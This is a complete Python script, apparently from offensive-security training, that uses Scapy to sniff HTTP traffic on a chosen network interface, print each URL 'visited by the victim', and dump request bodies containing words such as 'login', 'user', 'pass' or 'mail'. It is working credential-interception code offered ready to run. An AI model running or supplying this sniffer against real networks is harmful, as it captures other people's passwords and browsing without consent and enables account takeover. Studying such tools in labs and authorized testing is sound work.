#!/usr/bin/env python3

import scapy.all as scapy
import argparse
import signal
import sys
from scapy.layers import http
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Aborting...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL+C

def get_arguments():
    parser = argparse.ArgumentParser(description="HTTP Sniffer")
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="set the interface for interception i.e. -i <interface> (ens33/eth0)")
    args = parser.parse_args()

    return args.interface

def process_packet(packet):
    data_keywords = ["login", "user", "pass", "mail"]

    if packet.haslayer(http.HTTPRequest):
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        print(colored(f"[+] URL visited by the victim: {url}", 'blue'))

        if packet.haslayer(scapy.Raw):
            try:
                response = packet[scapy.Raw].load.decode()

                for keyword in data_keywords:
                    if keyword in response:
                        print(colored(f"[+] data captured: {response}\n", 'cyan'))
                        break
            except:
                pass

def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)

def run_sniffer():
    interface = get_arguments()
    sniff(interface)

if __name__ == "__main__":
    run_sniffer()
